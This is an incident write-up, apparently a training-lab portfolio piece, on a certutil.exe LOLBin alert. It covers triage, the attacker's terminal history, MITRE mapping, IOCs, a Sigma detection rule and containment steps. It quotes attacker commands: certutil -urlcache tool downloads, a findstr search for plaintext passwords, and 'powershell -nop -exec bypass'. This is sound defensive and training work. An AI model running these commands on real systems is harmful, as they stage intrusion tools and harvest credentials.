
# SOC163 - Suspicious Certutil.exe Usage 

## 🚨 Raw Alert Details
```text
EventID : 113
Event Time : 2022-03-01T11:06:20+03:00
Rule : SOC163 - Suspicious Certutil.exe Usage
Role : Security Analyst
Alert Type : LOLBin
Difficulty : Medium
MITRE ATT&CK : T1595, T1059, T1105
Hostname : EricProd
IP Address : 172.16.17.22
Binary Path : C:/Windows/System32/certutil.exe
Command Line : certutil.exe -urlcache -split -f https://nmap.org/dist/nmap-7.92-win32.zip nmap.zip
EDR Action : Allowed
Trigger Reason : -f parameter with certutil.exe
```

## Alert Overview
- **Severity:** Medium
- **Detection Source:** EDR / Sysmon
- **Asset Affected:** EricProd (172.16.17.22)
- **Threat Type:** Living off the Land (LOLBin) / Internal Reconnaissance / Tool Staging
- **Verdict:** True Positive (Compromised)
- **Containment Status:** Contained (Isolated)

## 🧠 Attack Context / Technical Background
This incident demonstrates a post-exploitation staging and reconnaissance phase by an active threat actor. Rather than introducing custom, easily flagged malware downloaders, the attacker abused **`certutil.exe`**, a native, signed Windows utility designed for managing certificates. 

**The Mechanics:** Threat actors frequently abuse `certutil`'s `-urlcache` and `-f` (force) flags to quietly download files from the internet over HTTP/HTTPS, bypassing basic web-filtering rules and Application Whitelisting. Once the tool (such as Nmap or a privilege escalation checker) is downloaded, the attacker uses it to perform internal network scanning, search for plaintext configuration files, and prepare for lateral movement.

## Investigation Steps

### 1. Alert Triage & Initial Process Review
The investigation began by evaluating Event ID 113, which flagged the execution of `certutil.exe` with the `-f` (force download) parameter on host `EricProd`.
- **Process Lineage:** `explorer.exe` -> `cmd.exe` -> `certutil.exe`
- **Command Line:** `certutil.exe -urlcache -split -f https://nmap.org/dist/nmap-7.92-win32.zip nmap.zip`
- **Analysis:** This command instructs Windows to download the Nmap network scanner directly into the local environment, indicating active tool staging.


### 2. Endpoint Correlation (Terminal History)
To uncover the full scope of the attacker's activity, the EDR Terminal History for host `EricProd` was reviewed across a chronological timeline. The logs revealed a clear sequence of staging, discovery, and enumeration:
- `11:06` - Downloaded Nmap (`nmap.zip`) via `certutil`.
- `11:07` - Downloaded Windows-Exploit-Suggester (`windows-exploit-suggester.py`) from GitHub via `certutil`.
- `11:08` - Executed Nmap to scan the local subnet (`nmap -sV 192.168.0.0/24 -p 80`).
- `11:27` - Executed the exploit suggestion script (`python3 check.py`).
- `18:54` - Ran `arp -a` to map local network neighbors.
- `19:32` - Executed `findstr /si pass *.txt | *.xml | *.ini` to search the local file system for plaintext passwords or configuration secrets.
- `21:36` - Spawned an unrestricted PowerShell session (`powershell.exe -nop -exec bypass`).

<img width="1200" height="528" alt="image" src="https://github.com/user-attachments/assets/93f4d876-1d9c-43ad-a55e-257139ed74fa" />


### 3. Threat Intelligence Enrichment
The external domains and URLs fetched during the terminal session were checked against open-source intelligence platforms.
- **Finding:** The GitHub repository (`raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester`) and Nmap distribution domain (`nmap.org`) are legitimate tools, but their presence on a production enterprise workstation without administrative approval confirms malicious staging.

## Analysis & Findings
The incident is a confirmed **True Positive**. The host `EricProd` was actively utilized by an unauthorized entity (or an insider threat) to stage reconnaissance and exploitation tools. The attacker abused the `certutil` LOLBin to download Nmap and a privilege escalation checker, proceeded to scan the internal subnet, searched the local drive for plaintext credentials using `findstr`, and prepared a PowerShell execution bypass. The host is fully compromised.

## MITRE ATT&CK Mapping
| Tactic | Technique ID | Technique Name |
| :--- | :--- | :--- |
| **Defense Evasion** | T1218.011 | System Binary Proxy Execution: Certutil |
| **Command and Control** | T1105 | Ingress Tool Transfer |
| **Discovery** | T1046 | Network Service Discovery (Nmap scanning) |
| **Discovery** | T1082 | System Information Discovery (`systeminfo`) |
| **Credential Access** | T1552.001 | Unsecured Credentials: Plaintext Credentials in Files (`findstr`) |

## Indicators of Compromise (IOCs)
| Type | Value | Context |
| :--- | :--- | :--- |
| URL | `https://nmap.org/dist/nmap-7.92-win32.zip` | Downloaded Network Scanner |
| URL | `https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/...` | Downloaded Vulnerability Checker |
| Binary | `certutil.exe` | Abused LOLBin for Ingress Tool Transfer |

## 🛠️ Detection Engineering & Hunting Logic
To improve automated detection of `certutil` abuse, the following Sigma rule has been engineered for deployment in the SIEM:

```yaml
title: Suspicious Certutil URL Download
id: d81a9381-1234-4a5e-994d-20490b0f5e81
status: experimental
description: Detects the abuse of certutil.exe to download files from the internet using urlcache and split flags.
author: SOC Analyst Portfolio
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4688
    Image: '*\certutil.exe'
    CommandLine|contains:
      - '-urlcache'
      - '-verifyctl'
      - '-split'
      - '-f '
  condition: selection
falsepositives:
  - Legitimate certificate installation by administrators
level: high
tags:
  - attack.t1218.011
  - attack.t1105
```

## 🚀 Decision Tree 
1. **Analyze Execution:** Did `certutil.exe` run on the endpoint?
   - If Yes -> Check command line parameters.
2. **Evaluate Parameters:** Does the command line contain `-urlcache`, `-split`, or `-f` pointing to an external URL (HTTP/HTTPS)?
   - If Yes -> **High probability of malicious ingress tool transfer.**
3. **Verify Intent (Terminal/Process History):** Did the user or process subsequently execute the downloaded tool (e.g., Nmap, Metasploit, exploit scripts)?
   - If Yes -> **Verdict: True Positive - Successful Compromise (Recon/Staging).**
4. **Action:** Isolate host immediately and audit terminal history for lateral movement preparation.

## 📝 Playbook Questions & Answers
- **Is the alert a True Positive or False Positive?**
  - *Answer:* True Positive.
  - *Reasoning:* Terminal history confirms the active downloading of Nmap and exploit checkers via `certutil`, followed by internal subnet scanning.
- **Has the malware/tool been executed?**
  - *Answer:* Yes.
  - *Reasoning:* The downloaded tools (`nmap`, `windows-exploit-suggester`) were actively executed in the terminal by the user/attacker.
- **Does the device need to be isolated?**
  - *Answer:* Yes.
  - *Reasoning:* The system is compromised and has been used to conduct internal reconnaissance, posing an active threat to the rest of the internal network.

## Response & Containment Actions Taken
- **Host Isolation:** The compromised endpoint (`EricProd / 172.16.17.22`) was immediately **Isolated** from the network via EDR to prevent the attacker from completing lateral movement or exfiltrating credentials found via `findstr`.
- **Why:** Immediate containment stops an attacker in the "Staging & Discovery" phase before they can pivot to critical internal domain controllers or database servers.

## Recommendations
1. **AppLocker / WDAC Rule (Certutil):** Restrict or block execution of `certutil.exe` for standard users, or restrict its arguments to prevent `-urlcache` calls. 
2. **Egress Filtering:** Implement strict web filtering that blocks workstations from communicating directly with raw code repositories (`raw.githubusercontent.com`) or unapproved external software distribution links.
3. **Password Auditing:** Run an enterprise-wide credential scanner to identify plaintext passwords sitting in `.txt`, `.xml`, or `.ini` files, as the attacker attempted to harvest these using `findstr`.

## ⚖️ Mistakes and Lessons Learned
- **Analyst Reflection (LOLBins vs. Malware):** Initially, seeing `certutil.exe` might cause an analyst to think of standard certificate management. 
- **The Lesson:** Always check the command-line arguments. Legitimate system administration rarely uses `certutil -urlcache -split -f` to download third-party zip files from the public internet. Recognizing LOLBins in command-line telemetry is essential for catching human-operated intrusions.

## 🛠️ Skills & Tools Used
- EDR Terminal & Command Line Forensics
- LOLBin Identification (`certutil.exe`)
- Threat Intelligence Correlation
- Incident Containment (Host Isolation)
